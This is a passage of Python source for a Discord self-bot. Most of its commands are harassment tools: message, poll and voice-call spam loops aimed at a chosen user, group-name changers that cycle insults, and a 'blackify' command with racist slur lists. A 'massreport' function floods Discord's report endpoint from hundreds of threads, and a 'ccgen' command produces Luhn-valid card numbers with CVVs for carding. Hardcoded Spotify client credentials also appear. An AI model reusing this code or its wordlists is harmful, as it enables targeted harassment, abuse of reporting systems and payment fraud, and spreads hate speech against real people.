[37m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣷⣀⣀⣀⣀⠀⠀⠀⠀⣀⣀⣀⣀⣠⣤⡤
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⣿⣿⣿⣿⣿⣿⡿⠟⣻⣿⣿⣿⣿⣿⣥⣄⣀⣀⣀⡀
⠀⢀⣴⣶⣶⣦⣤⣄⠀⢷⣼⣿⣿⡿⠻⠁⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠀
⢀⣿⡿⢻⣿⣿⠿⠟⠀⠀⠟⠛⢿⠿⠿⠷⡶⠚⢻⣿⣿⣿⣿⣿⣋⣁⠀⠀⠀⠀
⠹⡟⠀⠸⡿⠁⠀⠀⠀⠀⠈⢄⠈⠀⠀⠀⠁⢀⣾⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠶⣤⣤⣶⣟⣿⣻⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⡾⣿⣿⡣⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠟⢻⣿⣿⢿⣿⣿⡝⠻⢷⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⢸⡿⠁⠀⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠁⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀[0m
``````js
"𒀱"             LOOKUP COMMANDS
``````js
[01]phonelookup [phone]
[02]ip [ip address]
[03]maclookup [mac]
[04]checkcc [card_num]
[05]poplelookup [name] [city]
[06]webhookinfo [webhook]
[07]inviteinfo [invite]
[08]portscan [url/ip] [start_port] [end_port]
```"""
    ]

@client.command()
async def help(ctx, page: int = 1):
    global help_message, help_author, help_expiry, pages

    total_pages = len(pages)

    if 1 <= page <= total_pages:
        
        loading_animation = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"

        async def progressive_reveal(content):
           
            initial_loading_message = await ctx.send(f"```ansi\n{red}⠋ {blue}Loading help page...{www}```")

            for frame in loading_animation:
                await initial_loading_message.edit(content=f"```ansi\n{red}{frame} {blue}Loading help page...{www}```")
                await asyncio.sleep(0.05)  

            
            reveal_stages = [
                {'percentage': 0.5, 'delay': 2.0},   
                {'percentage': 0.7, 'delay': 0.7},   
                {'percentage': 1.0, 'delay': 0}      
            ]

            for stage in reveal_stages:
                chunk_size = int(len(content) * stage['percentage'])
                chunked_content = content[:chunk_size]
                
                await initial_loading_message.edit(content=chunked_content)
                await asyncio.sleep(stage['delay'])

            
            await initial_loading_message.edit(content=content + 
                               f"```ansi\n              {www}Page {page}/{total_pages} - Type {red}p#{www} to navigate.```")

            return initial_loading_message

        
        help_message = await progressive_reveal(pages[page - 1])
        help_author = ctx.author
        help_expiry = asyncio.get_event_loop().time() + 60  

        await asyncio.sleep(60)
        help_message = None
        help_author = None
        help_expiry = None

    else:
        await ctx.send(f"Invalid page number. Please choose a page between 1 and {total_pages}.", delete_after=10)


def load_autopress():
    if not os.path.exists(CONFIG_PRESS):
        return {"messages": []}
    with open(CONFIG_PRESS, "r") as f:
        return json.load(f)

def save_config():
    with open(CONFIG_PRESS, "w") as f:
        json.dump(autopress_config, f, indent=4)
CONFIG_PRESS = "autopress_config.json"
autopress_config = load_autopress()
autopress_status = {}
ar1_targets = {}
ar2_targets = {} 
autoreact_users = {}
dreact_users = {}
autopress_messages = {}
autopress_status = {}
exile_messages = {}
exile_status = {} 
force_delete_users = defaultdict(bool)  
afk_users={}
autoreplies = [
"# P R O P H E T   runs u"
]
autoreply_tasks = {}
auto_flood_users = {}
outlast_users = {}
outlast_tasks = {} 
outlast_running = False
exile_users = {}

import logging


logging.basicConfig(level=logging.INFO)


self_gcname = [
    "{UPuser} UR ASS LOL", "{UPuser}UR FUCKIN LOSER DORK FUCK", "{UPuser} BITCH ASS NIGGA DONT FOLD", "{UPuser} WE GOING FOREVER PEDO", "{UPuser}Justice SELF BOT>>>", "{UPuser}Justice RUNS U", "{UPuser}ERROR RUNS U ", "{UPuser}SYNTAX RUNS U", "{UPuser}GHOSTY RUNS U", "{UPuser}RAVAN RUNS U ", "{UPuser}SANEMI RUNS U"

]

ugc_task = None       
@client.command()
async def ugc(ctx, user: discord.User):
    global ugc_task
    
    if ugc_task is not None:
        await ctx.send("```Group chat name changer is already running```")
        return
        
    if not isinstance(ctx.channel, discord.GroupChannel):
        await ctx.send("```This command can only be used in group chats.```")
        return

    async def name_changer():
        counter = 1
        unused_names = list(self_gcname)
        
        while True:
            try:
                if not unused_names:
                    unused_names = list(self_gcname)
                
                base_name = random.choice(unused_names)
                unused_names.remove(base_name)
                
                formatted_name = base_name.replace("{user}", user.name).replace("{UPuser}", user.name.upper())
                new_name = f"{formatted_name}   {counter}"
                
                await ctx.channel._state.http.request(
                    discord.http.Route(
                        'PATCH',
                        '/channels/{channel_id}',
                        channel_id=ctx.channel.id
                    ),
                    json={'name': new_name}
                )
                
                await asyncio.sleep(0.1)
                counter += 1
                
            except discord.HTTPException as e:
                if e.code == 429:
                    retry_after = e.retry_after if hasattr(e, 'retry_after') else 1
                    await asyncio.sleep(retry_after)
                    continue
                else:
                    await ctx.send(f"```Error: {str(e)}```")
                    break
            except asyncio.CancelledError:
                break
            except Exception as e:
                await ctx.send(f"```Error: {str(e)}```")
                break

    ugc_task = asyncio.create_task(name_changer())
    await ctx.send("```Group chat name changer started```")

@client.command()
async def ugcend(ctx):
    global ugc_task
    
    if ugc_task is None:
        await ctx.send("```Group chat name changer is not currently running```")
        return
        
    ugc_task.cancel()
    ugc_task = None
    await ctx.send("```Group chat name changer stopped```")

typing_active = {} 

@client.command()
async def triggertyping(ctx, time: str, channel: discord.TextChannel = None):

    
    if channel is None:
        channel = ctx.channel

    total_seconds = 0


    try:
        if time.endswith('s'):
            total_seconds = int(time[:-1]) 
        elif time.endswith('m'):
            total_seconds = int(time[:-1]) * 60  
        elif time.endswith('h'):
            total_seconds = int(time[:-1]) * 3600  
        else:
            total_seconds = int(time)  
    except ValueError:
        await ctx.send("Please provide a valid time format (e.g., 5s, 2m, 1h).")
        return

   
    typing_active[channel.id] = True

    try:
        async with channel.typing():
            await ctx.send(f"```Triggered typing for {total_seconds}```")
            await asyncio.sleep(total_seconds)  
    except Exception as e:
        await ctx.send("```Failed to trigger typing```")
    finally:
        typing_active.pop(channel.id, None)

@client.command()
async def triggertypingoff(ctx, channel: discord.TextChannel = None):

    
    if channel is None:
        channel = ctx.channel

    if channel.id in typing_active:
        typing_active.pop(channel.id)  
        await ctx.send(f"```Stopped typing in {channel.name}.```")
    else:
        await ctx.send(f"```No typing session is active```")


import spotipy   
from spotipy.oauth2 import SpotifyOAuth
from spotipy.oauth2 import SpotifyOAuth

SPOTIFY_CLIENT_ID = '4a48f6f0c2594b2ba04560dc9a81c1bd'
SPOTIFY_CLIENT_SECRET = 'e81001326b8e47c19f974d2e60a2998f'
SPOTIFY_REDIRECT_URI = 'http://localhost:8888/callback'  
SCOPE = "user-read-playback-state user-modify-playback-state"

spotify_client = spotipy.Spotify(auth_manager=SpotifyOAuth(
    client_id=SPOTIFY_CLIENT_ID,
    client_secret=SPOTIFY_CLIENT_SECRET,
    redirect_uri=SPOTIFY_REDIRECT_URI,
    scope=SCOPE
))
@client.command()
async def spotify(ctx, action=None, *args):
    if not action:
        await ctx.send("Usage: `.spotify <unpause/pause/next/prev/volume/current/play/shuffle/addqueue/repeat>`")
        return

    try:
        if action.lower() == "unpause":
            spotify_client.start_playback()
            await ctx.send("``` Resumed playback.```")

        elif action.lower() == "pause":
            spotify_client.pause_playback()
            await ctx.send("```Paused playback.```")

        elif action.lower() == "next":
            spotify_client.next_track()
            await ctx.send("```Skipped to next track.```")

        elif action.lower() == "prev":
            spotify_client.previous_track()
            await ctx.send("```Reverted to previous track.```")

        elif action.lower() == "volume":
            try:
                volume = int(args[0])
                if 0 <= volume <= 100:
                    spotify_client.volume(volume)
                    await ctx.send(f"```Volume set to {volume}%.```")
                else:
                    await ctx.send("```Volume must be between 0 and 100.```")
            except (ValueError, IndexError):
                await ctx.send("```Usage: .spotify volume <0-100>```")

        elif action.lower() == "current":
            current_track = spotify_client.current_playback()
            if current_track and current_track['item']:
                track_name = current_track['item']['name']
                artists = ", ".join([artist['name'] for artist in current_track['item']['artists']])
                await ctx.send(f"``` Now Playing: \n{track_name} by {artists}```")
            else:
                await ctx.send("```No track currently playing.```")

        elif action.lower() == "play":
            query = " ".join(args)
            if query:
                results = spotify_client.search(q=query, type="track", limit=1)
                tracks = results.get('tracks', {}).get('items')
                if tracks:
                    track_uri = tracks[0]['uri']
                    spotify_client.start_playback(uris=[track_uri])
                    await ctx.send(f"```Now Playing: {tracks[0]['name']} by {', '.join([artist['name'] for artist in tracks[0]['artists']])}```")
                else:
                    await ctx.send("```No results found for that song.```")
            else:
                await ctx.send("```Usage: .spotify play <song name> to play a specific song.```")

        elif action.lower() == "shuffle":
            if args and args[0].lower() in ['on', 'off']:
                state = args[0].lower()
                if state == "on":
                    spotify_client.shuffle(True)
                    await ctx.send("```Shuffle mode turned on.```")
                else:
                    spotify_client.shuffle(False)
                    await ctx.send("```Shuffle mode turned off.```")
            else:
                await ctx.send("```Usage: .spotify shuffle <on/off> to toggle shuffle mode.```")

        elif action.lower() == "addqueue":
            query = " ".join(args)
            if query:
                results = spotify_client.search(q=query, type="track", limit=1)
                tracks = results.get('tracks', {}).get('items')
                if tracks:
                    track_uri = tracks[0]['uri']
                    spotify_client.add_to_queue(track_uri)
                    await ctx.send(f"```Added {tracks[0]['name']} by {', '.join([artist['name'] for artist in tracks[0]['artists']])} to the queue.```")
                else:
                    await ctx.send("```No results found for that song.```")
            else:
                await ctx.send("```Usage: .spotify addqueue <song name> to add a song to the queue.```")

        elif action.lower() == "repeat":
            if args and args[0].lower() in ['track', 'context', 'off']:
                state = args[0].lower()
                if state == "track":
                    spotify_client.repeat("track")
                    await ctx.send("```Repeat mode set to track.```")
                elif state == "context":
                    spotify_client.repeat("context")
                    await ctx.send("```Repeat mode set to context.```")
                else:
                    spotify_client.repeat("off")
                    await ctx.send("```Repeat mode turned off.```")
            else:
                await ctx.send("```Usage: .spotify repeat <track/context/off> to set the repeat mode.```")

        else:
            await ctx.send("```Invalid action. Use .spotify <unpause/pause/next/prev/volume/current/play/shuffle/addqueue/repeat>```")

    except spotipy.SpotifyException as e:
        await ctx.send(f"```Error controlling Spotify: {e}```")

insults_enabled = False  
autoinsults = [
    "your a skid",
    "stfu",
    "your such a loser",
    "fuck up boy",
    "no.",
    "why are you a bitch",
    "nigga you stink",
    "idk you",
    "LOLSSOL WHO ARE YOUa",
    "stop pinging me boy",
    "if your black stfu"
    
]

@client.command(name="pinginsult")
async def pinginsult(ctx, action: str = None, *, insult: str = None):
    global insults_enabled

    if action is None:
        await ctx.send("```You need to specify an action: toggle, list, or clear.```")
        return

    if action.lower() == "toggle":
        insults_enabled = not insults_enabled  
        status = "enabled" if insults_enabled else "disabled"
        await ctx.send(f"```Ping insults are now {status}!```")

    elif action.lower() == "list":
        if autoinsults:
            insult_list = "\n".join(f"- {insult}" for insult in autoinsults)
            await ctx.send(f"```Current ping insults:\n{insult_list}```")
        else:
            await ctx.send("```No insults found in the list.```")

    elif action.lower() == "clear":
        autoinsults.clear()
        await ctx.send("```Ping insults cleared!```")

    else:
        await ctx.send("```Invalid action. Use toggle, list, or clear.```")

    

@client.command()
async def image(ctx, *, query: str):

    query = '+'.join(query.split())
    url = f"https://www.bing.com/images/search?q={query}&form=HDRSC2"

    headers = {
        "User-Agent": "Mozilla/5.0"
    }
    try:
        res = requests.get(url, headers=headers)
        if res.status_code != 200:
            await ctx.send("err")
            return

    
    
        matches = re.findall(r'murl&quot;:&quot;(.*?)&quot;', res.text)
        if not matches:
            await ctx.send("No image")
            return
        await ctx.send(matches[0])  
    except Exception as e:
        await ctx.send("Err")

def luhngen(prefix: str) -> str:
    digits = [int(d) for d in prefix]
    for i in range(len(digits) - 1, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9
    checksum = sum(digits)
    checkdig = (10 - (checksum % 10)) % 10
    return prefix + str(checkdig)

@client.command()
async def ccgen(ctx, bin: str = None, month: str = None, year: str = None, cvv: str = None, qty: str = None):
    ghostycurryear = int(time.strftime("%Y"))  # Get the current year using time module

    if not bin:
        await ctx.send("Usage: `ccgen <bin> [mm] [yyyy] [cvv] [quantity]`\nExample: `ccgen 411111xxxxxxxxxx 06 2026 123 10`")
        return

    try:
        quantity = int(qty) if qty else 1
        if quantity <= 0 or quantity > 222:
            await ctx.send("Quantity must be between 1 and 222.")
            return
    except ValueError:
        await ctx.send("Invalid quantity.")
        return

    if not re.fullmatch(r'[x\d]{6,15}', bin):
        await ctx.send("Invalid BIN format. Use 6 to 15 digits or 'x'. Must leave 1 digit for Luhn check.")
        return

    results = []

    for _ in range(quantity):
        ghostyccprefix = ''
        for ch in bin:
            ghostyccprefix += str(random.randint(0, 9)) if ch == 'x' else ch

        while len(ghostyccprefix) < 15:
            ghostyccprefix += str(random.randint(0, 9))

        ghostyccnumb = luhngen(ghostyccprefix)

        mm = month.zfill(2) if month and month.isdigit() and 1 <= int(month) <= 12 else str(random.randint(1, 12)).zfill(2)

        try:
            yy = str(year) if year and int(year) >= ghostycurryear else str(random.randint(ghostycurryear, ghostycurryear + 5))
        except ValueError:
            yy = str(random.randint(ghostycurryear, ghostycurryear + 5))

        if not cvv or cvv.lower() in ['rnd', 'random']:
            ghostycvvval = str(random.randint(100, 999))
        elif cvv.isdigit() and 3 <= len(cvv) <= 4:
            ghostycvvval = cvv
        else:
            await ctx.send("CVV must be 3–4 digits or type 'random' to generate.")
            return

        results.append(f"{ghostyccnumb}|{mm}|{yy}|{ghostycvvval}")

    if quantity <= 10:
        await ctx.send("```" + "\n".join(results) + "```")
    else:
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as tmp:
            tmp.write("\n".join(results))

@client.command()
async def ttt(ctx, opponent: discord.User = None):
    
    if opponent and opponent == ctx.author:
        await ctx.send("❌ You can't play against yourself!")
        return

    
    board = [' ' for _ in range(9)]
    
    def draw_board(board):
        emoji_map = {
            ' ': '⬜',
            'X': '❌',
            'O': '⭕'
        }
        board_display = []
        for i, cell in enumerate(board, 1):
            board_display.append(emoji_map.get(cell, cell))
        
        return (f"```\n"
                f"{board_display[0]}|{board_display[1]}|{board_display[2]} 1|2|3\n"
                f"---+---+---\n"
                f"{board_display[3]}|{board_display[4]}|{board_display[5]} 4|5|6\n"
                f"---+---+---\n"
                f"{board_display[6]}|{board_display[7]}|{board_display[8]} 7|8|9\n"
                f"```")
    
    def check_winner(board):
        win_combos = [
            [0, 1, 2], [3, 4, 5], [6, 7, 8],  
            [0, 3, 6], [1, 4, 7], [2, 5, 8],  
            [0, 4, 8], [2, 4, 6]  
        ]
        
        for combo in win_combos:
            if board[combo[0]] == board[combo[1]] == board[combo[2]] != ' ':
                return board[combo[0]]
        return None
    
    def is_board_full(board):
        return ' ' not in board
    
    def advanced_bot_move(board):
        # Win move
        for i in range(9):
            board_copy = board.copy()
            if board_copy[i] == ' ':
                board_copy[i] = 'O'
                if check_winner(board_copy) == 'O':
                    return i
        
        
        for i in range(9):
            board_copy = board.copy()
            if board_copy[i] == ' ':
                board_copy[i] = 'X'
                if check_winner(board_copy) == 'X':
                    return i
        
        
        if board[4] == ' ':
            return 4
        
        
        corners = [0, 2, 6, 8]
        corner_moves = [c for c in corners if board[c] == ' ']
        if corner_moves:
            return random.choice(corner_moves)
        
       
        empty_spots = [i for i in range(9) if board[i] == ' ']
        return random.choice(empty_spots)

    
    if opponent:
        players = [ctx.author, opponent]
        symbols = ['X', 'O']
        current_player_index = 0
        game_type = "Multiplayer"
    else:
        players = [ctx.author, "AI"]
        symbols = ['X', 'O']
        current_player_index = 0
        game_type = "AI"

    
    initial_message = f"🎮 {game_type} Tic Tac Toe: {players[0].mention} vs {players[1] if isinstance(players[1], str) else players[1].mention}"
    await ctx.send(initial_message)

    while True:
        current_player = players[current_player_index]
        current_symbol = symbols[current_player_index]

        
        board_message = await ctx.send(draw_board(board))

        
        if current_player == "AI":
            ai_thinking_msg = await ctx.send("🤖 AI is thinking...")
            move = advanced_bot_move(board)
            board[move] = 'O'
            
            
            await board_message.delete()
            await ai_thinking_msg.delete()
            
            
            await ctx.send(f"🤖 AI placed 'O' in position {move + 1}")

        else:
            
            turn_message = await ctx.send(f"🎲 {current_player.mention}'s turn. Choose a number (1-9)")
            
            def check(m):
                return (m.author == current_player and 
                        m.channel == ctx.channel and 
                        m.content.isdigit() and 
                        1 <= int(m.content) <= 9)
            
            try:
                move_msg = await client.wait_for('message', check=check, timeout=30.0)
                move = int(move_msg.content) - 1
                
                if board[move] != ' ':
                    await ctx.send(f"❌ Position {move + 1} is already taken. Try again.")
                    
                    await board_message.delete()
                    await turn_message.delete()
                    continue
                
                board[move] = current_symbol
                
                
                await board_message.delete()
                await turn_message.delete()
                
                
                await ctx.send(f"✅ {current_player.mention} placed '{current_symbol}' in position {move + 1}")

            except asyncio.TimeoutError:
                await ctx.send(f"⏰ {current_player.mention} took too long.")
                break

       
        winner = check_winner(board)
        if winner:
            await ctx.send(f"🏆 {current_player.mention} wins with {winner}!")
            break
        
        # Check Draw
        if is_board_full(board):
            await ctx.send("🤝 It's a draw!")
            break
        
        
        current_player_index = 1 - current_player_index

auto_flood_users = {}


def load_autoflood_data():
    global auto_flood_users
    if os.path.exists("ar_ids.txt"):
        try:
            with open("ar_ids.txt", "r") as f:
                for line in f:
                    try:
                       
                        user_id, message, server_or_channel = line.strip().split("||")
                        auto_flood_users[(int(user_id), server_or_channel)] = message
                    except ValueError:
                        print(f"Error parsing line: {line.strip()}")
        except Exception as e:
            print(f"Error loading autoflood data: {str(e)}")
    else:
        print("No existing autoflood data found. Starting fresh.")


def save_autoflood_data():
    try:
        with open("ar_ids.txt", "w") as f:
            for (user_id, server_or_channel), message in auto_flood_users.items():
                f.write(f"{user_id}||{message}||{server_or_channel}\n")
    except Exception as e:
        print(f"Error saving autoflood data: {str(e)}")


async def send_flood_reply_message(original_message, message):
    flood_response = "\n" * 1000  
    full_message = f"A\n{flood_response}\n{message}"
    try:
        await original_message.reply(full_message, mention_author=True)
    except Exception as e:
        print(f"Error sending flood message: {str(e)}")
        
@client.command()
async def autoflood(ctx, mentioned_user: discord.User, *, message: str):
    await ctx.message.delete()
    user_id = mentioned_user.id
    if ctx.guild:   
        server_id = ctx.guild.id
     
        auto_flood_users[(user_id, str(server_id))] = message
        
    else:
        channel_id = ctx.channel.id 
        
        auto_flood_users[(user_id, str(channel_id))] = message
        

  
    save_autoflood_data()


@client.command()
async def stopautoflood(ctx, mentioned_user: discord.User):
    await ctx.message.delete()
    user_id = mentioned_user.id
    if ctx.guild:  
        server_id = ctx.guild.id
        key = (user_id, str(server_id))
    else:  
        channel_id = ctx.channel.id
        key = (user_id, str(channel_id))

    if key in auto_flood_users:
        del auto_flood_users[key]  

        save_autoflood_data()

        await ctx.send(f"Stopped autoflood for {mentioned_user.mention} in this context", delete_after=1)
    else:
        await ctx.send(f"{mentioned_user.mention} is not currently flooding in this context.", delete_after=1)

blackify_tasks = {}
blackifys = [
    "woah jamal dont pull out the nine",
    "cotton picker 🧑‍🌾",
    "back in my time...",
    "worthless nigger! 🥷",
    "chicken warrior 🍗",
    "its just some watermelon chill 🍉",
    "are you darkskined perchance?",
    "you... STINK 🤢"
]
@client.command()
async def blackify(ctx, user: discord.Member):
    blackify_tasks[user.id] = True
    await ctx.send(f"```Seems to be that {user.name}, IS BLACK 🤢```")

    emojis = ['🍉', '🍗', '🤢', '🥷', '🔫']

    while blackify_tasks.get(user.id, False):
        try:
            async for message in ctx.channel.history(limit=10):
                if message.author.id == user.id:
                    for emoji in emojis:
                        try:
                            await message.add_reaction(emoji)
                        except:
                            pass
                    try:
                        reply = random.choice(blackifys)
                        await message.reply(reply)
                    except:
                        pass
                        
                    break
                    
            await asyncio.sleep(1)
        except:
            pass

@client.command()
async def unblackify(ctx, user: discord.Member):
    if user.id in blackify_tasks:
        blackify_tasks[user.id] = False
        await ctx.send(f"```Seems to me that {user.name}, suddenly changed races 🧑‍🌾```") 

def read_exile_messages():
    try:
        with open('exile.txt', 'r', encoding='utf-8') as file:
            messages = [line.strip() for line in file if line.strip()]
        return messages
    except FileNotFoundError:
        print("exile.txt file not found!")
        return ["No messages available"]
    except Exception as e:
        print(f"Error reading exile.txt: {e}")
        return ["Error reading messages"]

@client.command()
async def exile(ctx, mentioned_user: discord.User):
    await ctx.message.delete()

    user_id = mentioned_user.id

   
    exile_messages = read_exile_messages()

    if user_id in exile_users:
        del exile_users[user_id]
        return

    exile_users[user_id] = True

    async def rapid_send():
        count = 1

        while user_id in exile_users:
            try:

                random_message = random.choice(exile_messages)

                await ctx.send(f"> # **{random_message}** {mentioned_user.mention}\n> ```js\n> {count}```")
                count += 1



            except Exception as e:
                print(f"Error in outlast: {e}")
                break

    client.loop.create_task(rapid_send())

@client.command()
async def stopexile(ctx):
    
    channel_id = ctx.channel.id

    
    users_to_remove = [
        user_id for user_id, status in exile_users.items() 
        if status is True
    ]

    
    for user_id in users_to_remove:
        del exile_users[user_id]

    await ctx.send("```Exile session has been stopped```")

@client.command()
async def outlast(ctx, mentioned_user: discord.User, *, message: str):
    await ctx.message.delete()

    user_id = mentioned_user.id

 
    if user_id in outlast_users:
        del outlast_users[user_id]
        return

    outlast_users[user_id] = True


    async def rapid_send():
        count = 1
        while user_id in outlast_users:
            try:
                
                await ctx.send(f"> # **{message}** {mentioned_user.mention}\n> ```js\n> {count}```")
                count += 1

            except Exception as e:
                print(f"Error in outlast: {e}")
                break

    
    client.loop.create_task(rapid_send())

@client.command()
async def stopoutlast(ctx):
    
    channel_id = ctx.channel.id

    
    users_to_remove = [
        user_id for user_id, status in outlast_users.items() 
        if status is True
    ]

    
    for user_id in users_to_remove:
        del outlast_users[user_id]

    await ctx.send("```Outlast session has been stopped```")


def load_questions():
    try:
        with open('exile.txt', 'r', encoding='utf-8') as file:
            questions = file.read().splitlines()
        return [q.strip() for q in questions if q.strip()]
    except FileNotFoundError:
        print("exile.txt not found. Using default questions.")
        return ["Default Question 1", "Default Question 2"]

# Global variables
poll_users = {}
questions_list = load_questions()
poll_tasks = []  

@client.command()
async def pollspam(ctx, mentioned_user: discord.User):
    """
    Native Poll Spam with Correct Emoji Handling
    """
    await ctx.message.delete()

    user_id = mentioned_user.id
    poll_users[user_id] = True

    async def continuous_poll_creation():
        while user_id in poll_users:
            try:
                
                random_question = random.choice(questions_list)

                
                poll_payload = {
                    "type": 3,  
                    "poll": {
                        "question": {
                            "text": random_question,
                            "intents": False
                        },
                        "answers": [
                            {
                                "poll_media": {
                                    "text": "SYNTAX PAPA",
                                    "emoji": {
                                        "name": "💀"
                                    }
                                }
                            },
                            {
                                "poll_media": {
                                    "text": "NIGGA ASF",
                                    "emoji": {
                                        "name": "☠️"
                                    }
                                }
                            },
                            {
                                "poll_media": {
                                    "text": "YOU FUCKED",
                                    "emoji": {
                                        "name": "☠️"
                                    }
                                }
                            },
                            {
                                "poll_media": {
                                    "text": "I RAPED YOUR MOM",
                                    "emoji": {
                                        "name": "💀"
                                    }
                                }
                            }
                        ],
                        "duration": 1,
                        "allow_multiselect": False
                    }
                }

                
                headers = {
                    "Authorization": client.http.token,
                    "Content-Type": "application/json",
                    "User -Agent": "Mozilla/5.0"
                }

                
                message_payload = {
                    "content": str(mentioned_user.mention),
                    "poll": poll_payload["poll"]
                }

            
                response = requests.post(
                    f"https://discord.com/api/v9/channels/{ctx.channel.id}/messages",
                    headers=headers,
                    data=json.dumps(message_payload)
                )

                if response.status_code not in [200, 201]:
                    print(f"Poll creation failed: {response.status_code}")
                    print(f"Response details: {response.text}")

                
                await asyncio.sleep(0.1)  

            except asyncio.CancelledError:
                print("Polling task was cancelled.")
                break
            except Exception as e:
                print(f"Continuous Poll Creation Error: {type(e).__name__}: {e}")
                break

    
    task = client.loop.create_task(continuous_poll_creation())
    poll_tasks.append(task)

@client.command()
async def stoppoll(ctx):
    """Stop all ongoing poll spams"""
    global poll_users
    
    
    poll_users.clear()

    
    for task in poll_tasks:
        task.cancel()
    
    
    poll_tasks.clear()

    
    await ctx.send("```Poll Session has been stopped```")

vc_spam_task = None

async def connect_and_disconnect(channel_id):
    uri = 'wss://gateway.discord.gg/?v=9&encoding=json'
    while True:
        try:
            async with websockets.connect(uri, max_size=None) as websocket:
                identify_payload = {
                    'op': 2,
                    'd': {
                        'token': token,
                        'intents': 513,
                        'properties': {
                            '$os': 'linux',
                            '$browser': 'my_library',
                            '$device': 'my_library'
                        }
                    }
                }
                identify_payload_str = json.dumps(identify_payload)
                await websocket.send(identify_payload_str)

                voice_state_payload = {
                    'op': 4,
                    'd': {
                        'guild_id': None,
                        'channel_id': channel_id,
                        'self_mute': False,
                        'self_deaf': False,
                        'self_video': False,
                        'request_to_speak_timestamp': round(time.time())
                    }
                }
                voice_state_payload_str = json.dumps(voice_state_payload)
                await websocket.send(voice_state_payload_str)

                await asyncio.sleep(1.5)

                voice_state_payload = {
                    'op': 4,
                    'd': {
                        'guild_id': None,
                        'channel_id': None,
                        'self_mute': False,
                        'self_deaf': False,
                        'self_video': False
                    }
                }
                voice_state_payload_str = json.dumps(voice_state_payload)
                await websocket.send(voice_state_payload_str)

                url = f'https://discord.com/api/v9/channels/{channel_id}/call/ring'
                headers = {
                    'Authorization': f'{token}',
                    'User-Agent': 'my_library/0.0.1',
                    'Content-Type': 'application/json'
                }
                data = {'recipients': None}
                requests.post(url, headers=headers, json=data)
                
                await asyncio.sleep(1.5)

        except Exception:
            await asyncio.sleep(1.5)
@client.command()
async def vcspam(ctx, gc_id: int):
    await ctx.message.delete()
    global vc_spam_task
    if vc_spam_task is not None:
        return

    vc_spam_task = client.loop.create_task(connect_and_disconnect(gc_id))

@client.command()
async def vcstop(ctx):
    await ctx.message.delete()
    global vc_spam_task
    if vc_spam_task is None:
        return

    vc_spam_task.cancel()
    vc_spam_task = None

async def create_invite_via_api(token, channel_id):
    url = f"https://discord.com/api/v9/channels/{channel_id}/invites"
    headers = {
        "Authorization": f"{token}",
        "Content-Type": "application/json"
    }
    json_data = {
        "max_age": 0,
        "max_uses": 0,
        "temporary": False,
        "unique": True
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(url, json=json_data, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                return data['url']
            return None

@client.command()
async def massreport(ctx, guild_id: str):
    await ctx.message.delete()
    global headers
    token = token
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)

    if r.status_code == 200:
        await ctx.send("valid token")
    else:
        await ctx.send("invalid token")
        return

    reasons_message = (
        "Choose a reason:\n"
        "0 - Illegal Content\n"
        "1 - Harassment\n"
        "2 - Spam or Phishing Links\n"
        "3 - Self Harm\n"
        "4 - NSFW Content"
    )
    await ctx.send(reasons_message)
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    reason1_message = await client.wait_for('message', check=check)
    global reason1
    reason1 = reason1_message.content

    await ctx.send("Enter the Channel ID:")
    channel_id_message = await client.wait_for('message', check=check)
    global channel_id1
    channel_id1 = channel_id_message.content

    await ctx.send("Enter the Message ID:")
    message_id_message = await client.wait_for('message', check=check)
    global message_id1
    message_id1 = message_id_message.content

    def MassReport():
        headers = {
            'User-Agent': 'Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0',
            'Authorization': token,
            'Content-Type': 'application/json'
        }

        payload = {
            'channel_id': channel_id1,
            'guild_id': guild_id,
            'message_id': message_id1,
            'reason': reason1
        }

        while True:
            r = requests.post('https://discord.com/api/v9/report', headers=headers, json=payload)
            if r.status_code == 201:
                print(f"sent report ID {message_id1}")
            elif r.status_code == 401:
                print("unauthorized")
                return
            else:
                print(f"failed with status code: {r.status_code}")

    for i in range(500, 1000):
        Thread(target=MassReport).start()

@client.command()
async def unafk(ctx):
    if ctx.author.id in afk_users:
        del afk_users[ctx.author.id]
        save_afk_users(afk_users)
        await ctx.send(f"**Welcome back! You are no longer AFK.**")
    await ctx.message.delete()

@client.command(name="afk")
async def afk(ctx, *, reason=None):
    afk_users[ctx.author.id] = reason
    save_afk_users(afk_users)
    await ctx.send(f"**YOU ARE NOW AFK. Reason: {reason if reason else 'No reason provided.'}**")
    await ctx.message.delete()

class DiscordStatusChanger:
    def __init__(self, token):
        self.token = token
        self.headers = {
            "Authorization": token,
